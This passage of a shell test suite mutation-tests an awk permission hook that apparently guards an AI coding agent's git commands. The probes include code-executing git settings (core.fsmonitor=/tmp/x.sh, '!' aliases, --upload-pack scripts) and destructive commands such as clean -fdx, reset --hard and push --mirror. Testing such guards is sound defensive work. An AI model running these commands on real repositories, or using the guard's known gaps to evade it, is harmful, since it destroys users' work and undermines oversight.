assert_contains "$MCP_OUT" "mcp__context-mode__ctx_execute" "the denial names the MCP tool, not a shell command"

# ── mutation controls ──────────────────────────────────────────────────────
# Every expectation above is only worth what a broken guard would cost it. Each control
# below breaks the guard in one specific way and asserts the matching verdict FLIPS. A
# control that does not flip means the assertion it protects was passing for some other
# reason.
echo ""
echo "[mutation controls: the assertions above must fail against a broken guard]"

# new_mut <label> -> a fresh fixture with its own pristine copy of the guard.
#
# The label, not a counter: these helpers run inside command substitution, so a counter
# incremented here never reaches the caller and every mutation would land in one fixture
# and COMPOUND. That is not a hypothetical — it happened while writing this suite, and
# the controls went green over a guard whose key table had been emptied several
# mutations ago. rm -rf first, because `cp -R src dst` with dst present copies *into* it
# on BSD and leaves the previous mutation in place.
new_mut() {
  local dir="$WORK/mut-$(printf '%s' "$1" | tr -c 'A-Za-z0-9._-' '_')"
  [ -n "${WORK:-}" ] && [ -d "$WORK" ] || { echo "  FAIL: no temp dir for a mutation fixture" >&2; exit 1; }
  rm -rf "$dir"
  mkfixture "$dir" relaxed
  printf '%s' "$dir"
}

# mutate <find> <replace> -> fixture dir
# Operates on CODE, never on a header comment: the find string must occur exactly once
# outside a comment line, or the mutation aborts. An earlier draft of this suite replaced
# the first textual occurrence and silently edited the file's own documentation, so six
# controls reported a guard that had never been broken.
mutate() {
  local dir; dir="$(new_mut "mutate-$1")"
  mutate_file "$dir/.claude/hooks/egress-guard.awk" "$1" "$2"
  printf '%s' "$dir"
}

# mutate_lib <find> <replace> -> fixture dir, the same on lib-tokenize.awk, which holds
# the wrapper tables the git walk reaches through cmdword_x.
mutate_lib() {
  local dir; dir="$(new_mut "mutate-lib-$1")"
  mutate_file "$dir/.claude/hooks/lib-tokenize.awk" "$1" "$2"
  printf '%s' "$dir"
}

mutate_file() { # mutate_file <path> <find> <replace>
  python3 - "$1" "$2" "$3" <<'PY'
import sys
path, find, repl = sys.argv[1:4]
lines = open(path, encoding="utf-8").read().split("\n")
hits = [i for i, l in enumerate(lines) if find in l and not l.lstrip().startswith("#")]
if len(hits) != 1:
    sys.exit("mutation target %r matched %d non-comment lines, wanted 1" % (find, len(hits)))
lines[hits[0]] = lines[hits[0]].replace(find, repl)
open(path, "w", encoding="utf-8").write("\n".join(lines))
PY
}

# drop_key <key> -> fixture dir with that key removed from the guard's own key table.
# The key list is read back out of the guard rather than restated here, so the controls
# cover whatever set actually ships and a key added later gets one for free.
drop_key() {
  local dir; dir="$(new_mut "drop-$1")"
  python3 - "$dir/.claude/hooks/egress-guard.awk" "$1" <<'PY'
import re, sys
path, drop = sys.argv[1:3]
text = open(path, encoding="utf-8").read()
m = re.search(r'^(\s*GC_EXEC = ")([^"]*)(")\s*$', text, re.M)
if not m:
    sys.exit("no GC_EXEC assignment found in %s" % path)
keys = m.group(2).split()
if drop not in keys:
    sys.exit("key %r is not in GC_EXEC (%s)" % (drop, " ".join(keys)))
kept = " ".join(k for k in keys if k != drop)
open(path, "w", encoding="utf-8").write(
    text[:m.start()] + m.group(1) + kept + m.group(3) + text[m.end():])
PY
  printf '%s' "$dir"
}

# add_key <key> -> fixture dir with an ORDINARY key wrongly added to the table.
add_key() {
  local dir; dir="$(new_mut "add-$1")"
  python3 - "$dir/.claude/hooks/egress-guard.awk" "$1" <<'PY'
import re, sys
path, add = sys.argv[1:3]
text = open(path, encoding="utf-8").read()
m = re.search(r'^(\s*GC_EXEC = ")([^"]*)(")\s*$', text, re.M)
if not m:
    sys.exit("no GC_EXEC assignment found in %s" % path)
open(path, "w", encoding="utf-8").write(
    text[:m.start()] + m.group(1) + add + " " + m.group(2) + m.group(3) + text[m.end():])
PY
  printf '%s' "$dir"
}

# flips <label> <fixture> <command> <shipped-verdict> <mutated-verdict>
flips() {
  local got; got="$(ask_in "$2" relaxed "$3")"
  TOTAL=$((TOTAL + 1))
  if [ "$got" = "$5" ]; then
    echo "  PASS: planted failure caught — $1 (shipped $4, broken guard $got)"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: planted failure NOT caught — $1: broken guard still says $got, wanted $5"
    echo "        ($3)"
    FAIL=$((FAIL + 1))
  fi
}

# 1. The case fold removed: the whole reason this is a hook rather than a glob.
M="$(mutate 'k = tolower(unmark(key))' 'k = unmark(key)')"
flips "case fold dropped, so Alias.z walks past" "$M" "git config Alias.z '!x'" DENY PASS
flips "...while the lowercase spelling still fires, so only the fold broke" \
  "$M" "git config alias.z '!x'" DENY DENY

# 2. Each code-executing key, removed from the table one at a time. The list comes from
#    the guard, so there is no second copy of it here to drift.
GC_KEYS="$(sed -n 's/^[[:space:]]*GC_EXEC = "\(.*\)"[[:space:]]*$/\1/p' "$GUARD_SRC")"
TOTAL=$((TOTAL + 1))
if [ -n "$GC_KEYS" ]; then
  echo "  PASS: read the guard's own key table: $GC_KEYS"
  PASS=$((PASS + 1))
else
  echo "  FAIL: no GC_EXEC key table found in $GUARD_SRC, so no key control can be built"
  FAIL=$((FAIL + 1))
fi
for key in $GC_KEYS; do
  case "$key" in
    'alias.*') probe="git config alias.z '!x'" ;;
    *)         probe="git config $key evil" ;;
  esac
  M="$(drop_key "$key")"
  flips "$key removed from the key table" "$M" "$probe" DENY PASS
done

# 3. A read wrongly gated: the narrowing this PR makes is load-bearing too, so breaking
#    it has to be caught. The probe carries a <value-pattern>, so the "a bare key with no
#    value is a read" rule cannot stand in for the read set and mask the break.
M="$(mutate 'o == "--get" ||' 'o == "--get-NOT-A-REAL-FLAG" ||')"
flips "--get dropped from the read set, so an ordinary read is gated" \
  "$M" "git config --get alias.z '^!'" PASS DENY

# 4. An ordinary key wrongly gated: user.email added to the table must break the
#    /quick-commit path, and the suite has to notice.
M="$(add_key user.email)"
flips "user.email added to the key table, so a normal setup step is gated" \
  "$M" "git config user.email dev@example.com" PASS DENY

# 5. Subcommand anchoring removed: the guard would fire on a key that is merely an
#    argument to some other git subcommand. This is the false-positive class that teaches
#    evasion, so it gets a control of its own.
M="$(mutate 'if (GW_SUB != "config") return ""' 'if (GW_SUB == "") return ""')"
flips "subcommand anchor removed, so a git grep for the key fires the gate" \
  "$M" "git grep core.hooksPath docs/" PASS DENY

# 6. The destructive pass. Its scope — prefixed only — is the whole promise that it
#    changes no tier's policy, so breaking that has to be caught.
M="$(mutate 'if (!GW_PREFIXED) return ""' 'if (0) return ""')"
flips "the prefixed-only scope removed, so the hook starts deciding what the globs own" \
  "$M" "git clean -fdx" PASS DENY

# 7. Each included subcommand, switched off one at a time.
M="$(mutate 'GW_SUB == "clean"' 'GW_SUB == "clean-NOT-A-SUBCOMMAND"')"
flips "clean switched off"    "$M" "git --no-pager clean -fdx" DENY PASS
M="$(mutate 'GW_SUB == "restore"' 'GW_SUB == "restore-NOT"')"
flips "restore switched off"  "$M" "git --no-pager restore ." DENY PASS
M="$(mutate 'GW_SUB == "checkout"' 'GW_SUB == "checkout-NOT"')"
flips "checkout -- switched off" "$M" "git --no-pager checkout -- ." DENY PASS
M="$(mutate 'GW_SUB == "reset"' 'GW_SUB == "reset-NOT"')"
flips "reset --hard switched off" "$M" "git --no-pager reset --hard HEAD~3" DENY PASS
M="$(mutate 'GW_SUB == "reflog"' 'GW_SUB == "reflog-NOT"')"
flips "reflog expire switched off" "$M" "git --no-pager reflog expire --all" DENY PASS
M="$(mutate 'GW_SUB == "prune"' 'GW_SUB == "prune-NOT"')"
flips "prune switched off" "$M" "git --no-pager prune" DENY PASS
M="$(mutate 'GW_SUB == "push"' 'GW_SUB == "push-NOT"')"
flips "push --mirror switched off" "$M" "git --no-pager push --mirror origin" DENY PASS
M="$(mutate 'T[i] ~ /^--upload-pack/' 'T[i] ~ /^--upload-pack-NOT/')"
flips "the --upload-pack transport override switched off" \
  "$M" "git --no-pager fetch --upload-pack=/tmp/x.sh ." DENY PASS
M="$(mutate 'T[i] ~ /^--receive-pack/' 'T[i] ~ /^--receive-pack-NOT/')"
flips "the --receive-pack transport override switched off" \
  "$M" "git --no-pager push --receive-pack=/tmp/x.sh origin main" DENY PASS

# 8. The exclusions are assertions too: `git --no-pager branch -D x` staying silent is
#    only worth something if the suite would notice `branch` being added.
M="$(mutate 'GW_SUB == "clean"' 'GW_SUB == "branch"')"
flips "branch added to the destructive set, so a recoverable delete is gated" \
  "$M" "git --no-pager branch -D old-branch" PASS DENY
#    And prune's boundary: matched as a substring instead of the subcommand, it would gate
#    prune-packed, so "prune-packed stays silent" has to be able to fail.
M="$(mutate 'GW_SUB == "prune"' 'GW_SUB ~ /prune/')"
flips "prune matched as a substring, so prune-packed is gated" \
  "$M" "git --no-pager prune-packed" PASS DENY

# 9. The global-option walk itself: drop an operand-taking option and the walk lands on
#    the operand instead of the subcommand, which is a MISS rather than a false positive.
M="$(mutate 'o == "--git-dir"' 'o == "--git-dir-NOT"')"
flips "--git-dir dropped from the operand list, so the walk loses the subcommand" \
  "$M" "git --git-dir .git clean -fd" DENY PASS
flips "...while the =-spelling still fires, since it needs no operand skip" \
  "$M" "git --git-dir=.git clean -fd" DENY DENY

# 10. The bare form. Requiring an argument after the subcommand is the exact belief the
#     first version of this pass encoded — that `Bash(git clean *)` needs one — so putting
#     it back has to reopen `git --no-pager clean` and nothing else.
M="$(mutate 'if (GW_SUB == "clean")' 'if (GW_SUB == "clean" && i <= n)')"
flips "an argument required after clean again, so the bare prefixed form walks past" \
  "$M" "git --no-pager clean" DENY PASS
flips "...while clean with an argument still fires, so only the bare form broke" \
  "$M" "git --no-pager clean -fd" DENY DENY

# 11. GITCFG: each option, switched off on its own, and the prefixed-only scope.
M="$(mutate 'o == "--config-env")) GW_CFG = o' 'o == "--config-env-NOT")) GW_CFG = o')"
flips "--config-env dropped from GITCFG, so the prefixed spelling walks past" \
  "$M" "git --no-pager --config-env=core.fsmonitor=X status" DENY PASS
flips "...while a prefixed -c still fires, so only --config-env broke" \
  "$M" "git --no-pager -c core.fsmonitor=/tmp/x.sh status" DENY DENY
M="$(mutate '(o == "-c" ||' '(o == "-c-NOT" ||')"
flips "-c dropped from GITCFG, so git --no-pager -c walks past again" \
  "$M" "git --no-pager -c core.fsmonitor=/tmp/x.sh status" DENY PASS
M="$(mutate 'if (k > 0 && GW_CFG' 'if (k >= 0 && GW_CFG')"
flips "GITCFG's prefixed-only scope removed, so the hook starts deciding what the rule owns" \
  "$M" "git --config-env=core.fsmonitor=X status" PASS DENY

# 12. reflog delete and drop, each switched off, and the read boundary beside them:
#     `reflog show` staying silent is only worth something if adding it would show.
M="$(mutate 'T[i] == "delete"' 'T[i] == "delete-NOT"')"
flips "reflog delete switched off" "$M" "git --no-pager reflog delete HEAD@{1}" DENY PASS
M="$(mutate 'T[i] == "drop")' 'T[i] == "drop-NOT")')"
flips "reflog drop switched off" "$M" "git --no-pager reflog drop --all" DENY PASS
M="$(mutate 'T[i] == "drop")' 'T[i] == "drop" || T[i] == "show")')"
flips "reflog show added to the destructive set, so a read is gated" \
  "$M" "git --no-pager reflog show" PASS DENY

# 13. gc --prune: switched off; cut loose from the gc subcommand, which is the substring
#     hazard prune-packed once posed; and loosened to the bare word, which --no-prune
#     carries while never beginning `--prune`.
M="$(mutate 'GW_SUB == "gc"' 'GW_SUB == "gc-NOT"')"
flips "gc --prune switched off" "$M" "git --no-pager gc --prune=now" DENY PASS
M="$(mutate 'GW_SUB == "gc"' 'GW_SUB != ""')"
flips "the --prune test cut loose from gc, so fetch --prune is gated" \
  "$M" "git --no-pager fetch --prune" PASS DENY
M="$(mutate 'T[i] ~ /^--prune/' 'T[i] ~ /prune/')"
flips "the --prune test loosened to the word prune, so gc --no-prune is gated" \
  "$M" "git --no-pager gc --no-prune" PASS DENY

# 14. The walk. --shallow-file out of the operand list puts its operand in subcommand
#     position; the help/version stop removed brings back #254's false positive; and
#     the wrapper option table unconsulted puts nice's "5" where git should be.
M="$(mutate '|| o == "--shallow-file")' ')')"
flips "--shallow-file dropped from the operand list, so the walk loses the subcommand" \
  "$M" "git --shallow-file x clean -fdx" DENY PASS
M="$(mutate 'if (o == "-h" || o == "--help"' 'if (o == "-h-NOT" || o == "--help-NOT"')"
flips "the help stop removed, so git --help clean is read as a prefixed clean" \
  "$M" "git --help clean" PASS DENY
flips "...while the version and path queries still stop, so only help broke" \
  "$M" "git --version clean" PASS PASS
M="$(mutate_lib 'if (operands && ci < n && kit_wrapper_optarg(w, T[ci])) ci++' 'ci = ci')"
flips "the wrapper option table unconsulted, so nice -n 5 hides git" \
  "$M" "nice -n 5 git --no-pager clean -fdx" DENY PASS
flips "...while a wrapper with no option still fires, so only the table broke" \
  "$M" "nice git --no-pager clean -fdx" DENY DENY

print_summary
